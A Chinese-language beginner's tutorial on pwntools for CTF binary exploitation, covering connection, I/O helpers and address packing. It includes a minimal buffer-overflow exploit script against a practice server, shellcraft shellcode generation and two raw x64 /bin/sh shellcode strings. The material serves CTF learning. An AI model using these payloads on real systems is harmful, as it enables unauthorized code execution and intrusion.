# pwntools入门

参考链接：

[【二进制安全】PWN基础入门大全（非常详细）零基础入门到精通，收藏这一篇就够了-CSDN博客](https://blog.csdn.net/leah126/article/details/140679045)

[Pwn | 快速入门 - NewStar CTF](https://ns.openctf.net/learn/pwn.html)

[超全PWN入门笔记，从栈到堆一步到位 - X0H3M1 - 博客园](https://www.cnblogs.com/X0H3M1/articles/16669128.html)

[你想有多PWN(不再更新)_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1mr4y1Y7fW/?spm_id_from=333.337.search-card.all.click&vd_source=f264368eefdba6c9e52d63931d176453)

[[Pwn之路\] 欢迎来到堆攻击的世界——简单堆溢出原理和例题 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/endpoint/371095.html)

[第二章_第13节_ret2syscall_x1.5_整合_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1mr4y1Y7fW?spm_id_from=333.788.videopod.episodes&vd_source=f264368eefdba6c9e52d63931d176453&p=23)

[PWN 64位程序寄存器的使用-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2277507)





## pwntools的使用

**Pwntools** 是一个用于漏洞利用和二进制分析的 `Python 库`

`pwntools`可以说是pwn手必备的工具，它帮助pwn手`连接远程服务器`，`发送信息`，`接收信息`，以及提供了很多工具来帮助pwn手快速攻克题目



安装：

```
>>> apt-get update
>>> apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
>>> python3 -m pip install --upgrade pip
>>> python3 -m pip install --upgrade pwntools
```



直接cmd里面执行

```
pip install pwntools
```





### 导入pwntools

```py
from pwn import *
```



### 需要分清楚靶机的具体信息，不然无法连接

比如：

```python
context(os='linux', arch='AMD64', log_level='debug')
```



### 连接靶机具体ip和端口号：   nc连接

```python
用于连接远程服务器，并把连接到的进程命名为p，后续的函数都围绕这个p进程展开
p = remote("ip",port) 
比如:p = remote("node5.buuoj.cn",5555)
```



如果用ssh连接，则：

```python
通过使用ssh来连接靶机
p = ssh(host='192.168.xx.xxx', user='xidp', port=6666, password='88888888')
```



### 发送信息：

```python
**************************************************
p.send(payload) # 直接发送payload
**************************************************
p.sendline(payload) # 发送payload，但是结尾会有一个\n
**************************************************
p.sendafter("string", payload) # 接收到 string (这里说的string可以替换成任何信息) 之后会发送payload，但是如果没有接收到string，那么就会导致脚本一直卡在这里不动
**************************************************
p.sendlineafer("string", payload) # 接收到 string 之后会发送payload 并且在payload最后添加\n
```

tips:

如果函数是`gets()`和`scanf()`这类函数它们会以`\n`作为结束符号，这时候就需要我们手动发送`\n` 不然函数无法结束，这时候就需要使用`p.sendline(payload) ` 



如果函数是`read()` 这类的函数，使用`p.sendline`和`p.send`都可以,但是需要区分不同情况





### 接受信息：

```python
p.recv(int) 利用recv来接收返回的数据，并且可以控制接受到的字节数
比如:p.recv(7) => 系统输出'hello world' => 我们会接受到'hello w' 

p.recvline('string') 设置一个标识符，接收标识符所在的那一行
比如:p.recvline('O.o')
#系统输出:
Hello World 
This is a test. 
O.o This is the target line. 
Goodbye.
#我们接收:
O.o This is the target line. 
**************************************************
p.recvlines(N) 接收 N 行输出
**************************************************
p.recvuntil('string') 可以指定接收到某一字符串的时候停止 ,还有第二个参数 drop，drop=True(默认为false) 表示丢弃设定的停止符号
比如:p.recvuntil('or') 
#系统输出:
hello world 
#我们接收:
hello wor  
比如:a = io.recvuntil(']', drop=True)
就是一直获取到`]`符号出现就停止，并且不接收`]`符号
**************************************************
```



只有信息多才需要使用这个



### 构造发送地址类型

#### `p64/p32/u64/u32`这类函数的作用:

```python
**************************************************
p64(int) 
p64(0xfaceb00c) => '\x0c\xb0\xce\xfa\x00\x00\x00\x00\x00'
**************************************************
u64(str) 
u64('\x0c\xb0\xce\xfa\x00\x00\x00\x00') =>0xfaceb00c
**************************************************
p32(int)  
p32(0xfaceb00c) => '\x0c\xb0\xce\xfa'
**************************************************
u32(str) 
u32('\x0c\xb0\xce\xfa') => 0xfaceb00c
**************************************************

```





### 本地调试

```
io=process("./pwn")

```



### 传递到终端

```python
p.interactive()
接受信息并且在终端操作，程序拿到shell
```





### 一个最基本的payload如下：

```python
from pwn  import *
import pwnlib
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')

if __name__ == '__main__':
	
	HOST = 'node4.buuoj.cn'
	PORT = 29105
	conn = remote(HOST ,PORT)
	payload = "A"*0x17 + p64(0x40118A)
	conn.sendline(payload)
	conn.interactive()
```



### 汇编与反汇编



```python
>>> asm('mov eax, 0')   #汇编
'\xb8\x00\x00\x00\x00'

>>> disasm('\xb8\x0b\x00\x00\x00')  #反汇编
'mov    eax,0xb'
```



### shellcode

```python
context(os='linux', arch='i386')
# 表示将当前执行上下文的体系结构设置为i386(这里的i386可以通过checksec来查看文件是什么架构的  
shellcode = asm(shellcraft.sh())
# asm()是把括号内的内容编译成机器码(只有机器码才可以执行)，一般用来打入后门。pwntools自带的后门函数，可以生成类似system('/bin/sh/')这样功能的汇编代码 
# 通常可以配合  .ljust() 来使用  
shellcode.ljust(112, b'A')  
# 这里的 .ljust() 是 Python 中字符串对象的方法，用于在字符串的右侧填充指定的字符，使字符串达到指定的长度。

```



```python
from pwn import *
context(arch='i386', os='linux')
shellcode = asm(shellcraft.sh())
shellcode.ljust(112, b'A')  
```



如果不用库自带的shellcode，可以有一些编译好的shellcode



64位Linux的24Byte的ShellCode：

```
shellcode_x64 ="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
```



64位Linux的23Byte的shellcode：

```
shellcode_x64 ="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```







### 报错问题：

#### 1.使用p64()时报错：TypeError: can only concatenate str (not “bytes“) to str

```python
p64(0x00400596).decode('unicode_escape')
```







# 重点基础知识

1. 













